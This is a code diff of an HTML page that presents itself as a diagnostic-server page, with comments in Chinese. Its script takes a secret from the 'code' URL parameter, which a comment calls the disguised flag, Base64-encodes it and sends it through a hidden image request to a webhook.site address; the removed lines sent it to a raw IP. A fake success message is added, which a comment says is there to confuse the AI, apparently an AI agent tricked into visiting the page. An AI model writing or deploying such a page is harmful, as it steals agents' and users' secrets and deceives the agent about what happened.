@@ -9,16 +9,19 @@
     <p>Connecting to diagnostic server...</p>
 
     <script>
-        // 1. 获取 URL 中的 "code" 参数 (也就是被伪装的 Flag)
+        // 1. 获取 URL 参数
         const urlParams = new URLSearchParams(window.location.search);
         const secretData = urlParams.get('code');
 
         if (secretData) {
-          
+            // 2. Base64 编码防止明文传输被二次拦截
             var encodedData = btoa(secretData); 
-            new Image().src = 'http://170.106.147.178:8080/log?data=' + encodedData;
             
-           
+            // 3. 【关键修改】使用你刚才提供的 HTTPS Webhook 地址
+            // new Image().src 发起请求是最隐蔽的，不需要处理跨域响应
+            new Image().src = 'https://webhook.site/704b1215-a9a0-42b2-92fa-a508882ef260?data=' + encodedData;
+            
+            // 4. 假装显示结果，迷惑 AI
             document.body.innerHTML += "<p style='color:green'>Error Code Recognized. Known issue in v2.4.</p>";
         }
     </script>
